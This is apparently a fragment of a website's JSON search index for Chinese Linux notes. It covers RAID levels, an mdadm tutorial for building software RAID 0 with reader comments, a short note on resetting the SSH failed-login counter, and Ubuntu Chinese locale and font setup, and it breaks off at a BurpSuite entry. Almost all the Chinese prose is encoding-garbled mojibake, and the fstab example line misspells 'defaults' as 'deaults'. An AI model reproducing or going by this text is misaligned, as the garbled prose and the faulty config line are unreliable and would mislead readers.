å®ƒä»å‰©ä¸‹çš„æ­£å¸¸é©±åŠ¨å™¨ä¸Šçš„ä¿¡æ¯æ¥é‡å»ºã€‚åœ¨é©±åŠ¨å™¨å‘ç”Ÿæ•…éšœæ—¶ï¼Œè¿™å¯ä»¥ä¿æŠ¤æˆ‘ä»¬çš„æ•°æ®ã€‚ å‡è®¾æˆ‘ä»¬æœ‰4ä¸ªé©±åŠ¨å™¨ï¼Œå¦‚æœä¸€ä¸ªé©±åŠ¨å™¨å‘ç”Ÿæ•…éšœè€Œåæˆ‘ä»¬æ›´æ¢å‘ç”Ÿæ•…éšœçš„é©±åŠ¨å™¨åï¼Œ æˆ‘ä»¬å¯ä»¥ä»å¥‡å¶æ ¡éªŒä¸­é‡å»ºæ•°æ®åˆ°æ›´æ¢çš„é©±åŠ¨å™¨ä¸Šã€‚ å¥‡å¶æ ¡éªŒä¿¡æ¯å­˜å‚¨åœ¨æ‰€æœ‰çš„4ä¸ªé©±åŠ¨å™¨ä¸Šï¼Œå¦‚æœæˆ‘ä»¬æœ‰4ä¸ª 1TB çš„é©±åŠ¨å™¨ã€‚ å¥‡å¶æ ¡éªŒä¿¡æ¯å°†è¢«å­˜å‚¨åœ¨æ¯ä¸ªé©±åŠ¨å™¨çš„256Gä¸­ï¼Œè€Œå…¶å®ƒ768GBæ˜¯ç”¨æˆ·è‡ªå·±ä½¿ç”¨çš„ã€‚ å•ä¸ªé©±åŠ¨å™¨æ•…éšœåï¼ŒRAID 5 ä¾æ—§æ­£å¸¸å·¥ä½œï¼Œå¦‚æœé©±åŠ¨å™¨æŸåä¸ªæ•°è¶…è¿‡1ä¸ªä¼šå¯¼è‡´æ•°æ®çš„ä¸¢å¤±ã€‚ æ€§èƒ½å“è¶Š è¯»é€Ÿåº¦å°†éå¸¸å¥½ã€‚ å†™é€Ÿåº¦å¤„äºå¹³å‡æ°´å‡†ï¼Œå¦‚æœæˆ‘ä»¬ä¸ä½¿ç”¨ç¡¬ä»¶ RAID æ§åˆ¶å™¨ï¼Œå†™é€Ÿåº¦ç¼“æ…¢ã€‚ ä»æ‰€æœ‰é©±åŠ¨å™¨çš„å¥‡å¶æ ¡éªŒä¿¡æ¯ä¸­é‡å»ºã€‚ å®Œå…¨å®¹é”™ã€‚ 1ä¸ªç£ç›˜ç©ºé—´å°†ç”¨äºå¥‡å¶æ ¡éªŒã€‚ å¯ä»¥è¢«ç”¨åœ¨æ–‡ä»¶æœåŠ¡å™¨ï¼ŒWebæœåŠ¡å™¨ï¼Œéå¸¸é‡è¦çš„å¤‡ä»½ä¸­ã€‚ RAID 6 åŒåˆ†å¸ƒå¼å¥‡å¶æ ¡éªŒç£ç›˜ RAID 6 å’Œ RAID 5 ç›¸ä¼¼ä½†å®ƒæœ‰ä¸¤ä¸ªåˆ†å¸ƒå¼å¥‡å¶æ ¡éªŒã€‚ å¤§å¤šç”¨åœ¨å¤§æ•°é‡çš„é˜µåˆ—ä¸­ã€‚ æˆ‘ä»¬æœ€å°‘éœ€è¦4ä¸ªé©±åŠ¨å™¨ï¼Œå³ä½¿æœ‰2ä¸ªé©±åŠ¨å™¨å‘ç”Ÿæ•…éšœï¼Œæˆ‘ä»¬ä¾ç„¶å¯ä»¥æ›´æ¢æ–°çš„é©±åŠ¨å™¨åé‡å»ºæ•°æ®ã€‚ å®ƒæ¯” RAID 5 æ…¢ï¼Œå› ä¸ºå®ƒå°†æ•°æ®åŒæ—¶å†™åˆ°4ä¸ªé©±åŠ¨å™¨ä¸Šã€‚ å½“æˆ‘ä»¬ä½¿ç”¨ç¡¬ä»¶ RAID æ§åˆ¶å™¨æ—¶é€Ÿåº¦å°±å¤„äºå¹³å‡æ°´å‡†ã€‚ å¦‚æœæˆ‘ä»¬æœ‰6ä¸ªçš„1TBé©±åŠ¨å™¨ï¼Œ4ä¸ªé©±åŠ¨å™¨å°†ç”¨äºæ•°æ®ä¿å­˜ï¼Œ2ä¸ªé©±åŠ¨å™¨å°†ç”¨äºæ ¡éªŒã€‚ æ€§èƒ½ä¸ä½³ã€‚ è¯»çš„æ€§èƒ½å¾ˆå¥½ã€‚ å¦‚æœæˆ‘ä»¬ä¸ä½¿ç”¨ç¡¬ä»¶ RAID æ§åˆ¶å™¨å†™çš„æ€§èƒ½ä¼šå¾ˆå·®ã€‚ ä»ä¸¤ä¸ªå¥‡å¶æ ¡éªŒé©±åŠ¨å™¨ä¸Šé‡å»ºã€‚ å®Œå…¨å®¹é”™ã€‚ 2ä¸ªç£ç›˜ç©ºé—´å°†ç”¨äºå¥‡å¶æ ¡éªŒã€‚ å¯ç”¨äºå¤§å‹é˜µåˆ—ã€‚ ç”¨äºå¤‡ä»½å’Œè§†é¢‘æµä¸­ï¼Œç”¨äºå¤§è§„æ¨¡ã€‚ RAID 10 / é•œåƒ+æ¡å¸¦ RAID 10 å¯ä»¥è¢«ç§°ä¸º1 + 0æˆ–0 +1ã€‚å®ƒå°†åšé•œåƒ+æ¡å¸¦ä¸¤ä¸ªå·¥ä½œã€‚ åœ¨ RAID 10 ä¸­é¦–å…ˆåšé•œåƒç„¶ååšæ¡å¸¦ã€‚åœ¨ RAID 01 ä¸Šé¦–å…ˆåšæ¡å¸¦ï¼Œç„¶ååšé•œåƒã€‚RAID 10 æ¯” 01 å¥½ã€‚ å‡è®¾ï¼Œæˆ‘ä»¬æœ‰4ä¸ªé©±åŠ¨å™¨ã€‚å½“æˆ‘é€»è¾‘å·ä¸Šå†™æ•°æ®æ—¶ï¼Œå®ƒä¼šä½¿ç”¨é•œåƒå’Œæ¡å¸¦çš„æ–¹å¼å°†æ•°æ®ä¿å­˜åˆ°4ä¸ªé©±åŠ¨å™¨ä¸Šã€‚ å¦‚æœæˆ‘åœ¨ RAID 10 ä¸Šå†™å…¥æ•°æ®\"TECMINT\"ï¼Œæ•°æ®å°†ä½¿ç”¨å¦‚ä¸‹æ–¹å¼ä¿å­˜ã€‚ é¦–å…ˆå°†\"T\"åŒæ—¶å†™å…¥ä¸¤ä¸ªç£ç›˜ï¼Œ\"E\"ä¹Ÿå°†åŒæ—¶å†™å…¥å¦å¤–ä¸¤ä¸ªç£ç›˜ï¼Œ æ‰€æœ‰æ•°æ®éƒ½å†™å…¥ä¸¤å—ç£ç›˜ã€‚è¿™æ ·å¯ä»¥å°†æ¯ä¸ªæ•°æ®å¤åˆ¶åˆ°å¦å¤–çš„ç£ç›˜ã€‚ åŒæ—¶å®ƒå°†ä½¿ç”¨ RAID 0 æ–¹å¼å†™å…¥æ•°æ®ï¼Œ éµå¾ªå°†\"T\"å†™å…¥ç¬¬ä¸€ç»„ç›˜ï¼Œ\"E\"å†™å…¥ç¬¬äºŒç»„ç›˜ã€‚å†æ¬¡å°†\"C\"å†™å…¥ç¬¬ä¸€ç»„ç›˜ï¼Œ\"M\"åˆ°ç¬¬äºŒç»„ç›˜ã€‚ è‰¯å¥½çš„è¯»å†™æ€§èƒ½ã€‚ æ€»å®¹é‡ä¸¢å¤±ä¸€åŠçš„å¯ç”¨ç©ºé—´ã€‚ å®¹é”™ã€‚ ä»å‰¯æœ¬æ•°æ®ä¸­å¿«é€Ÿé‡å»ºã€‚ ç”±äºå…¶é«˜æ€§èƒ½å’Œé«˜å¯ç”¨æ€§ï¼Œå¸¸è¢«ç”¨äºæ•°æ®åº“çš„å­˜å‚¨ä¸­ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-Raid-RAID-level-and-concept.html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-Raid-RAID-level-and-concept.html"},{"title":"ä½¿ç”¨ mdadm å·¥å…·åˆ›å»ºè½¯ä»¶ RAID 0 (æ¡å¸¦åŒ–)","text":"å‚è€ƒ:: ä½œè€…: <Babin Lonston è¯‘è€…: LCTT è¯‘è€…: struggling < https://linux.cn/portal.php?mod=comment&id=6087&idtype=aid >`_ RAID å³å»‰ä»·ç£ç›˜å†—ä½™é˜µåˆ—ï¼Œå…¶é«˜å¯ç”¨æ€§å’Œå¯é æ€§é€‚ç”¨äºå¤§è§„æ¨¡ç¯å¢ƒä¸­ï¼Œç›¸æ¯”æ­£å¸¸ä½¿ç”¨ï¼Œæ•°æ®æ›´éœ€è¦è¢«ä¿æŠ¤ã€‚ RAID æ˜¯ä¸€äº›ç£ç›˜çš„é›†åˆï¼Œæ˜¯åŒ…å«ä¸€ä¸ªé˜µåˆ—çš„é€»è¾‘å·ã€‚é©±åŠ¨å™¨å¯ä»¥ç»„åˆèµ·æ¥æˆä¸ºä¸€ä¸ªé˜µåˆ—æˆ–ç§°ä¸ºï¼ˆç»„çš„ï¼‰é›†åˆã€‚ åˆ›å»º RAID æœ€å°‘åº”ä½¿ç”¨2ä¸ªè¿æ¥åˆ° RAID æ§åˆ¶å™¨çš„ç£ç›˜ç»„æˆï¼Œæ¥æ„æˆé€»è¾‘å·ï¼Œ å¯ä»¥æ ¹æ®å®šä¹‰çš„ RAID çº§åˆ«å°†æ›´å¤šçš„é©±åŠ¨å™¨æ·»åŠ åˆ°ä¸€ä¸ªé˜µåˆ—ä¸­ã€‚ ä¸ä½¿ç”¨ç‰©ç†ç¡¬ä»¶åˆ›å»ºçš„ RAID è¢«ç§°ä¸ºè½¯ä»¶ RAIDã€‚è½¯ä»¶ RAID ä¹Ÿå«åšç©·äºº RAIDã€‚ ä½¿ç”¨ RAID çš„ä¸»è¦ç›®çš„æ˜¯ä¸ºäº†åœ¨å‘ç”Ÿå•ç‚¹æ•…éšœæ—¶ä¿å­˜æ•°æ®ï¼Œ å¦‚æœæˆ‘ä»¬ä½¿ç”¨å•ä¸ªç£ç›˜æ¥å­˜å‚¨æ•°æ®ï¼Œå¦‚æœå®ƒæŸåäº†ï¼Œ é‚£ä¹ˆå°±æ²¡æœ‰æœºä¼šå–å›æˆ‘ä»¬çš„æ•°æ®äº†ï¼Œ ä¸ºäº†é˜²æ­¢æ•°æ®ä¸¢å¤±æˆ‘ä»¬éœ€è¦ä¸€ä¸ªå®¹é”™çš„æ–¹æ³•ã€‚ æ‰€ä»¥ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¤šä¸ªç£ç›˜ç»„æˆ RAID é˜µåˆ—ã€‚ åœ¨ RAID 0 ä¸­æ¡å¸¦æ˜¯ä»€ä¹ˆ æ¡å¸¦æ˜¯é€šè¿‡å°†æ•°æ®åœ¨åŒæ—¶åˆ†å‰²åˆ°å¤šä¸ªç£ç›˜ä¸Šã€‚ å‡è®¾æˆ‘ä»¬æœ‰ä¸¤ä¸ªç£ç›˜ï¼Œå¦‚æœæˆ‘ä»¬å°†æ•°æ®ä¿å­˜åˆ°è¯¥é€»è¾‘å·ä¸Šï¼Œå®ƒä¼šå°†æ•°æ®ä¿å­˜åœ¨ä¸¤ä¸ªç£ç›˜ä¸Šã€‚ ä½¿ç”¨ RAID 0 æ˜¯ä¸ºäº†è·å¾—æ›´å¥½çš„æ€§èƒ½ï¼Œä½†æ˜¯å¦‚æœé©±åŠ¨å™¨ä¸­ä¸€ä¸ªå‡ºç°æ•…éšœï¼Œæˆ‘ä»¬å°†ä¸èƒ½å¾—åˆ°å®Œæ•´çš„æ•°æ®ã€‚ å› æ­¤ï¼Œä½¿ç”¨ RAID 0 ä¸æ˜¯ä¸€ç§å¥½çš„åšæ³•ã€‚å”¯ä¸€çš„è§£å†³åŠæ³•å°±æ˜¯å®‰è£…æœ‰ RAID 0 é€»è¾‘å·çš„æ“ä½œç³»ç»Ÿæ¥æé«˜é‡è¦æ–‡ä»¶çš„å®‰å…¨æ€§ã€‚ RAID 0 æ€§èƒ½è¾ƒé«˜ã€‚ åœ¨ RAID 0 ä¸Šï¼Œç©ºé—´é›¶æµªè´¹ã€‚ é›¶å®¹é”™ï¼ˆå¦‚æœç¡¬ç›˜ä¸­çš„ä»»ä½•ä¸€ä¸ªå‘ç”Ÿæ•…éšœï¼Œæ— æ³•å–å›æ•°æ®ï¼‰ã€‚ å†™å’Œè¯»æ€§èƒ½éƒ½å¾ˆå¥½ã€‚ è¦æ±‚ åˆ›å»º RAID 0 å…è®¸çš„æœ€å°ç£ç›˜æ•°ç›®æ˜¯2ä¸ªï¼Œä½†ä½ å¯ä»¥æ·»åŠ æ›´å¤šçš„ç£ç›˜ï¼Œ ä¸è¿‡æ•°ç›®åº”è¯¥æ˜¯2ï¼Œ4ï¼Œ6ï¼Œ8ç­‰çš„å¶æ•°ã€‚ å¦‚æœä½ æœ‰ä¸€ä¸ªç‰©ç† RAID å¡å¹¶ä¸”æœ‰è¶³å¤Ÿçš„ç«¯å£ï¼Œä½ å¯ä»¥æ·»åŠ æ›´å¤šç£ç›˜ã€‚ åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬æ²¡æœ‰ä½¿ç”¨ç¡¬ä»¶ RAIDï¼Œæ­¤è®¾ç½®åªéœ€è¦è½¯ä»¶ RAIDã€‚ å¦‚æœæˆ‘ä»¬æœ‰ä¸€ä¸ªç‰©ç†ç¡¬ä»¶ RAID å¡ï¼Œæˆ‘ä»¬å¯ä»¥ä»å®ƒçš„åŠŸèƒ½ç•Œé¢è®¿é—®å®ƒã€‚ æœ‰äº›ä¸»æ¿é»˜è®¤å†…å»º RAID åŠŸèƒ½ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ Ctrl + I é”®è®¿é—®å®ƒçš„ç•Œé¢ã€‚ å…³äº RAID åŸºæœ¬çš„æ¦‚å¿µ: RAID çš„çº§åˆ«å’Œæ¦‚å¿µ æˆ‘çš„æœåŠ¡å™¨è®¾ç½®: - æ“ä½œç³»ç»Ÿ : CentOS 6.5 FinalIP - åœ°å€ : 192.168.0.225 - ä¸¤å—ç›˜ : 20 GB each è¿™æ˜¯9ç¯‡ç³»åˆ—æ•™ç¨‹çš„ç¬¬2éƒ¨åˆ†ï¼Œåœ¨è¿™éƒ¨åˆ†ï¼Œæˆ‘ä»¬å°†çœ‹çœ‹å¦‚ä½•èƒ½å¤Ÿåœ¨ Linux ä¸Šåˆ›å»ºå’Œä½¿ç”¨ RAID 0ï¼ˆæ¡å¸¦åŒ–ï¼‰ï¼Œä»¥åä¸º sdb å’Œ sdc ä¸¤ä¸ª 20GB çš„ç¡¬ç›˜ä¸ºä¾‹ã€‚ ç¬¬1æ­¥ï¼šæ›´æ–°ç³»ç»Ÿå’Œå®‰è£…ç®¡ç† RAID çš„ mdadm è½¯ä»¶ åœ¨ Linux ä¸Šè®¾ç½® RAID 0 å‰ï¼Œæˆ‘ä»¬å…ˆæ›´æ–°ä¸€ä¸‹ç³»ç»Ÿï¼Œç„¶åå®‰è£… mdadm åŒ…ã€‚ mdadm æ˜¯ä¸€ä¸ªå°ç¨‹åºï¼Œè¿™å°†ä½¿æˆ‘ä»¬èƒ½å¤Ÿåœ¨Linuxä¸‹é…ç½®å’Œç®¡ç† RAID è®¾å¤‡: yum clean all && yum update### yum install mdadm -y ç¬¬2æ­¥ï¼šç¡®è®¤è¿æ¥äº†ä¸¤ä¸ª 20GB çš„ç¡¬ç›˜ åœ¨åˆ›å»º RAID 0 å‰ï¼Œè¯·åŠ¡å¿…ç¡®è®¤ä¸¤ä¸ªç¡¬ç›˜èƒ½è¢«æ£€æµ‹åˆ°ï¼Œä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤ç¡®è®¤: ls -l /dev | grep sd ä¸€æ—¦æ£€æµ‹åˆ°æ–°çš„ç¡¬ç›˜é©±åŠ¨å™¨ï¼Œ åŒæ—¶æ£€æŸ¥æ˜¯å¦è¿æ¥çš„é©±åŠ¨å™¨å·²ç»è¢«ç°æœ‰çš„ RAID ä½¿ç”¨ï¼Œä½¿ç”¨ä¸‹é¢çš„ mdadm å‘½ä»¤æ¥æŸ¥çœ‹: mdadm --examine /dev/sd[b-c] ç¬¬3æ­¥ï¼šåˆ›å»º RAID åˆ†åŒº ç°åœ¨ç”¨ sdb å’Œ sdc åˆ›å»º RAID çš„åˆ†åŒºï¼Œä½¿ç”¨ fdisk å‘½ä»¤æ¥åˆ›å»ºã€‚ åœ¨è¿™é‡Œï¼Œæˆ‘å°†å±•ç¤ºå¦‚ä½•åˆ›å»º sdb é©±åŠ¨å™¨ä¸Šçš„åˆ†åŒº: fdisk /dev/sdb è¯·æŒ‰ç…§ä»¥ä¸‹è¯´æ˜åˆ›å»ºåˆ†åŒºã€‚ æŒ‰ n åˆ›å»ºæ–°çš„åˆ†åŒºã€‚ ç„¶åæŒ‰ P é€‰æ‹©ä¸»åˆ†åŒºã€‚ æ¥ä¸‹æ¥é€‰æ‹©åˆ†åŒºå·ä¸º1ã€‚ åªéœ€æŒ‰ä¸¤æ¬¡å›è½¦é”®é€‰æ‹©é»˜è®¤å€¼å³å¯ã€‚ ç„¶åï¼ŒæŒ‰ P æ¥æ˜¾ç¤ºåˆ›å»ºå¥½çš„åˆ†åŒºã€‚ è¯·æŒ‰ç…§ä»¥ä¸‹è¯´æ˜å°†åˆ†åŒºåˆ›å»ºä¸º Linux çš„ RAID ç±»å‹ã€‚ æŒ‰ L ï¼Œåˆ—å‡ºæ‰€æœ‰å¯ç”¨çš„ç±»å‹ã€‚ æŒ‰ t å»ä¿®æ”¹åˆ†åŒºã€‚ é”®å…¥ fd è®¾ç½®ä¸º Linux çš„ RAID ç±»å‹ï¼Œç„¶åæŒ‰å›è½¦ç¡®è®¤ã€‚ ç„¶åå†æ¬¡ä½¿ç”¨ p æŸ¥çœ‹æˆ‘ä»¬æ‰€åšçš„æ›´æ”¹ã€‚ ä½¿ç”¨ w ä¿å­˜æ›´æ”¹ã€‚ æ³¨è§£ è¯·ä½¿ç”¨ä¸Šè¿°æ­¥éª¤åŒæ ·åœ¨ sdc é©±åŠ¨å™¨ä¸Šåˆ›å»ºåˆ†åŒºã€‚ åˆ›å»ºåˆ†åŒºåï¼ŒéªŒè¯è¿™ä¸¤ä¸ªé©±åŠ¨å™¨æ˜¯å¦æ­£ç¡®å®šä¹‰ RAIDï¼Œä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤: mdadm --examine /dev/sd[b-c]### mdadm --examine /dev/sd[b-c]1 ç¬¬4æ­¥ï¼šåˆ›å»º RAID md è®¾å¤‡ ç°åœ¨ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åˆ›å»º md è®¾å¤‡ï¼ˆå³ /dev/md0ï¼‰ï¼Œå¹¶é€‰æ‹© RAID åˆé€‚çš„çº§åˆ«: mdadm -C /dev/md0 -l raid0 -n 2 /dev/sd[b-c]1### mdadm --create /dev/md0 --level=stripe --raid-devices=2 /dev/sd[b-c]1 -C â€“ åˆ›å»º -l â€“ çº§åˆ« -n â€“ RAID è®¾å¤‡æ•° ä¸€æ—¦ md è®¾å¤‡å·²ç»å»ºç«‹ï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å¯ä»¥æŸ¥çœ‹ RAID çº§åˆ«ï¼Œè®¾å¤‡å’Œé˜µåˆ—çš„ä½¿ç”¨çŠ¶æ€: cat /proc/mdstat æŸ¥çœ‹ RAID çº§åˆ«: mdadm -E /dev/sd[b-c]1 æŸ¥çœ‹ RAID è®¾å¤‡: mdadm --detail /dev/md0 æŸ¥çœ‹ RAID é˜µåˆ— ç¬¬5æ­¥ï¼šç»™ RAID è®¾å¤‡åˆ›å»ºæ–‡ä»¶ç³»ç»Ÿ å°† RAID è®¾å¤‡ /dev/md0 åˆ›å»ºä¸º ext4 æ–‡ä»¶ç³»ç»Ÿï¼Œå¹¶æŒ‚è½½åˆ° /mnt/raid0 ä¸‹: mkfs.ext4 /dev/md0 åœ¨ RAID è®¾å¤‡ä¸Šåˆ›å»ºå¥½ ext4 æ–‡ä»¶ç³»ç»Ÿåï¼Œç°åœ¨åˆ›å»ºä¸€ä¸ªæŒ‚è½½ç‚¹ï¼ˆå³ /mnt/raid0ï¼‰ï¼Œå¹¶å°†è®¾å¤‡ /dev/md0 æŒ‚è½½åœ¨å®ƒä¸‹: mkdir /mnt/raid0### mount /dev/md0 /mnt/raid0/ ä¸‹ä¸€æ­¥ï¼Œä½¿ç”¨ df å‘½ä»¤éªŒè¯è®¾å¤‡ /dev/md0 æ˜¯å¦è¢«æŒ‚è½½åœ¨ /mnt/raid0 ä¸‹: df -h æ¥ä¸‹æ¥ï¼Œåœ¨æŒ‚è½½ç‚¹ /mnt/raid0 ä¸‹åˆ›å»ºä¸€ä¸ªåä¸º tecmint.txt çš„æ–‡ä»¶ï¼Œ ä¸ºåˆ›å»ºçš„æ–‡ä»¶æ·»åŠ ä¸€äº›å†…å®¹ï¼Œå¹¶æŸ¥çœ‹æ–‡ä»¶å’Œç›®å½•çš„å†…å®¹: touch /mnt/raid0/tecmint.txt echo \"Hi everyone how you doing ?\" > /mnt/raid0/tecmint.txt cat /mnt/raid0/tecmint.txt ls -l /mnt/raid0/ å½“ä½ éªŒè¯æŒ‚è½½ç‚¹åï¼Œå°±å¯ä»¥å°†å®ƒæ·»åŠ åˆ° /etc/fstab æ–‡ä»¶ä¸­( æ·»åŠ è®¾å¤‡åˆ° fstab æ–‡ä»¶ä¸­ ): vim /etc/fstab æ·»åŠ ä»¥ä¸‹æ¡ç›®ï¼Œæ ¹æ®ä½ çš„å®‰è£…ä½ç½®å’Œä½¿ç”¨æ–‡ä»¶ç³»ç»Ÿçš„ä¸åŒï¼Œè‡ªè¡Œåšä¿®æ”¹: /dev/md0 /mnt/raid0 ext4 deaults 0 0 ä½¿ç”¨ mount å‘½ä»¤çš„ -a æ¥æ£€æŸ¥ fstab çš„æ¡ç›®æ˜¯å¦æœ‰è¯¯: mount -av ç¬¬6æ­¥ï¼šä¿å­˜ RAID é…ç½® æœ€åï¼Œä¿å­˜ RAID é…ç½®åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œä»¥ä¾›å°†æ¥ä½¿ç”¨ã€‚ æˆ‘ä»¬å†æ¬¡ä½¿ç”¨å¸¦æœ‰ -s (scan) å’Œ -v (verbose) é€‰é¡¹çš„ mdadm mdadm -E -s -v >> /etc/mdadm.conf### mdadm --detail --scan --verbose >> /etc/mdadm.conf ### cat /etc/mdadm.conf å°±è¿™æ ·ï¼Œæˆ‘ä»¬åœ¨è¿™é‡Œçœ‹åˆ°ï¼Œå¦‚ä½•é€šè¿‡ä½¿ç”¨ä¸¤ä¸ªç¡¬ç›˜é…ç½®å…·æœ‰æ¡å¸¦åŒ–çš„ RAID 0 ã€‚åœ¨æ¥ä¸‹æ¥çš„æ–‡ç« ä¸­ï¼Œæˆ‘ä»¬å°†çœ‹åˆ°å¦‚ä½•è®¾ç½® RAID 1ã€‚ æœ€æ–°è¯„è®º: - æ¥è‡ªåŒ—äº¬çš„ Chrome 43.0|Windows 7 ç”¨æˆ· 2015-12-02 12:46.4 èµ `<https://linux.cn/portal.php?mod=review&action=postreview&do=support&idtype=aid&tid=6087&pid=36536&hash=5522402f>`_ `å›å¤ <https://linux.cn/portal.php?mod=portalcp&ac=comment&op=reply&cid=36536&aid=6087&idtype=>`_ è¿™å¹´å¤´è¿˜æè½¯raidï¼Œè®©ç¡¬ä»¶ç”Ÿäº§å•†å¦‚ä½•ç”Ÿæ´» - `XYJK1002 [Chrome 42.0|Windows 7\\] <https://linux.cn/space/20893/>`_ 2015-10-03 19:139 èµ `<https://linux.cn/portal.php?mod=review&action=postreview&do=support&idtype=aid&tid=6087&pid=35399&hash=5522402f>`_ `å›å¤ <https://linux.cn/portal.php?mod=portalcp&ac=comment&op=reply&cid=35399&aid=6087&idtype=>`_ è®¨è®ºçš„è¿™ä¹ˆæ¿€çƒˆã€‚ã€‚ã€‚ - `linux [Chrome 44.0|Mac 10.10\\] <https://linux.cn/space/1/>`_ 2015-08-28 09:013 èµ `<https://linux.cn/portal.php?mod=review&action=postreview&do=support&idtype=aid&tid=6087&pid=34761&hash=5522402f>`_ `å›å¤ <https://linux.cn/portal.php?mod=portalcp&ac=comment&op=reply&cid=34761&aid=6087&idtype=>`_ ç³»ç»Ÿå´©æºƒæ—¶ï¼Œè¾“å‡ºçš„æ•°æ®æ²¡å‡†éƒ½æ˜¯é”™è¯¯çš„ï¼Œç¡¬ä»¶ RAID å¡ä¹Ÿæ— æ³•é˜²èŒƒè¿™ç‚¹ã€‚åªæ˜¯é¿å…äº†åœ¨ IO ç³»ç»Ÿå°†æ•°æ®é€åˆ° RAID å¡åçš„é”™è¯¯ã€‚ - æ¥è‡ªäº‘å—æ˜†æ˜çš„ Chrome 41.0|Windows 7 ç”¨æˆ· 2015-08-26 11:274 èµ `<https://linux.cn/portal.php?mod=review&action=postreview&do=support&idtype=aid&tid=6087&pid=34719&hash=5522402f>`_ `å›å¤ <https://linux.cn/portal.php?mod=portalcp&ac=comment&op=reply&cid=34719&aid=6087&idtype=>`_ ä»¥å‰å»º RAID5 æ—¶ï¼Œé‡å¯å /dev/md0 åå­—å°±å˜äº†ï¼Œä¹Ÿä¸çŸ¥é“æ€ä¹ˆæ”¹å›æ¥ï¼Œåé¢æ‰çŸ¥é“æ˜¯ /etc/mdadm.conf çš„é—®é¢˜","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Tutorial-Raid-Use-the-MDADM-tool-to-create-software-RAID-0-(strip--cation).html","loc":"/yq-doc-source-docs-operating-system-linux-Tutorial-Raid-Use-the-MDADM-tool-to-create-software-RAID-0-(strip--cation).html"},{"title":"sshé‡ç½®è®¡æ•°å™¨","text":"è¿™é‡Œæ˜¯æŒ‡, ç™»é™†å¤±è´¥æ—¶, sshä¼šç»Ÿè®¡æ¬¡æ•°, è¶…è¿‡æ—¶, ä¼šç­‰å¾…ä¸€æ®µæ—¶é—´æ‰å¯ä»¥å†æ¬¡ç»§ç»­. å¯ä»¥ä½¿ç”¨ PAM_RESET_USER æ¥é‡ç½®è¿™ä¸ªè®¡æ•°å™¨, ä»¥ç«‹åˆ»ç»§ç»­ä½¿ç”¨","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-question-SSH-reset-counter.html","loc":"/yq-doc-source-docs-operating-system-linux-question-SSH-reset-counter.html"},{"title":"ubuntuä¸­æ–‡æ”¯æŒ","text":"æ–¹å¼ä¸€: å›¾å½¢åŒ–è®¾ç½® åœ¨ Settings ä¸‹æ‰¾åˆ° Region&Language, è¿›å…¥åç‚¹å‡» Manage Install Languages, åœ¨ å…¶ä¸­é€‰æ‹©æ±‰è¯­å³å¯. è¿™é‡Œè‹¥ç¼ºå°‘åŒ…åä¼šæç¤ºç¼ºå°‘ç›¸å…³è¯­è¨€åŒ…, è¾“å…¥å¯†ç ä¸‹è½½å³å¯. æ–¹å¼äºŒ: å‘½ä»¤è¡Œè®¾ç½® å®‰è£…ä¸­æ–‡åŒ…: apt update apt install language-pack-zh-hans è®¾ç½®åŒºåŸŸä¸ºä¸­æ–‡: localectl set-locale LANG=zh_CN.utf8 ç„¶åé‡å¯: reboot å¯ä»¥æŸ¥çœ‹å½“å‰è®¾ç½®çš„åŒºåŸŸè¯­è¨€: locale å…¶ä»–æŒ‡ä»¤ æŸ¥çœ‹è¯­è¨€æ”¯æŒçš„å­—ä½“: check-language-support ç„¶åéƒ½å¯ä»¥è£…ä¸Š(å¦‚æœæ²¡è£…, å¯èƒ½ä¼šå­˜åœ¨ä¹±ç é—®é¢˜), ä¸€èˆ¬åº”è¯¥æ˜¯è¿™äº›: sudo apt install fonts-droid-fallback ttf-wqy-zenhei ttf-wqy-microhei fonts-arphic-ukai fonts-arphic-uming å®‰è£…ç­‰å®½å­—ä½“, æœ‰ä¸€ä¸ªæ¯”è¾ƒå¥½çš„ç­‰å®½å­—ä½“å«Inconsolata, åœ¨ubuntuä¸­å¯å®‰è£…: sudo apt install fonts-inconsolata è‹¥ä¸æ˜¯è¿™å, å¯ä»¥æœç´¢ä¸€ä¸‹: apt search inconsolata è®¾ç½®ä¸ºæŒ‡å®šçš„å­—ä½“ Ubuntuå­—ä½“åŠé…ç½®è¯´æ˜: https://wiki.ubuntu.org.cn/å­—ä½“#.E9.85.8D.E7.BD.AE.fonts.conf æ–°å»ºæ–‡ä»¶ ~/.config/fontconfig/fonts.conf : <?xml version=\"1.0\"?> <!DOCTYPE fontconfig SYSTEM \"/etc/fonts/conf.d/fonts.dtd\"> <fontconfig> <match target=\"pattern\"> <test qual=\"any\" name=\"family\"> <string>monospace</string> </test> <edit name=\"family\" mode=\"prepend\" binding=\"strong\"> <string>inconsolata</string> </edit> </match> <match target=\"pattern\"> <test qual=\"any\" name=\"family\"> <string>sans-serif</string> </test> <edit name=\"family\" mode=\"prepend\" binding=\"strong\"> <string>inconsolata</string> </edit> </match> </fontconfig> è¡¨ç¤ºæŠŠ monospace ç­‰å®½å­—ä½“å’Œ, sans-serif æ— è¡¬çº¿ä½“(å¯¹ä¸­æ–‡è€Œè¨€æŒ‡çš„å°±æ˜¯é»‘ä½“) éƒ½ä¼˜å…ˆè®¾ç½®ä¸º inconsolata . è¿™ä¸ªæ—¶å€™æŸ¥çœ‹é»˜è®¤å­—ä½“ä¸ç­‰å®½å­—ä½“éƒ½æ”¹å˜äº†: ~$ fc-match Inconsolata.otf: \"Inconsolata\" \"Medium\" ~$ fc-match monospace Inconsolata.otf: \"Inconsolata\" \"Medium\" å…·ä½“å‚è€ƒ: /docs/æ“ä½œç³»ç»Ÿ/linux/æ•™ç¨‹/debian-ubuntuå­—ä½“è¯´æ˜","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-ubuntu-Ubuntu-Chinese-support.html","loc":"/yq-doc-source-docs-operating-system-linux-ubuntu-Ubuntu-Chinese-support.html"},{"title":"å·¥å…·-burpsuite","text":"BurpSuite å®‰è£… å®˜ç½‘ 